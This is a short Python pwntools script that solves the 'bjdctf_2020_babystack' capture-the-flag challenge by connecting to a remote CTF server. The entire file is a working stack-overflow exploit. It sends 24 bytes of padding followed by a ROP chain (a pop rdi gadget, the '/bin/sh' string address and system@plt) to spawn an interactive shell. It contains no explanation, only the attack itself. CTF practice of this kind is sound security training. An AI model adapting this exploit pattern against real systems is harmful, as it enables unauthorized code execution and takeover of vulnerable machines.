from pwn import *


def bjdctf_2020_babystack(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/bjdctf_2020_babystack'):
    context(log_level='debug', arch='amd64',os='linux')
    target = remote('node5.buuoj.cn', 29518)
    target_elf = ELF(file_name)

    system_plt = p64(target_elf.plt['system'])
    bin_sh_str = p64(next(target_elf.search(b'/bin/sh')))

    pop_ret_gadget = p64(0x400833)  # pop rdi ; ret

    payload = b'A' * 24
    # system('/bin/sh')
    payload += pop_ret_gadget + bin_sh_str + system_plt

    target.sendlineafter('name:', b'50')
    target.sendlineafter('name?', payload)

    target.interactive()


if __name__ == '__main__':
    bjdctf_2020_babystack()
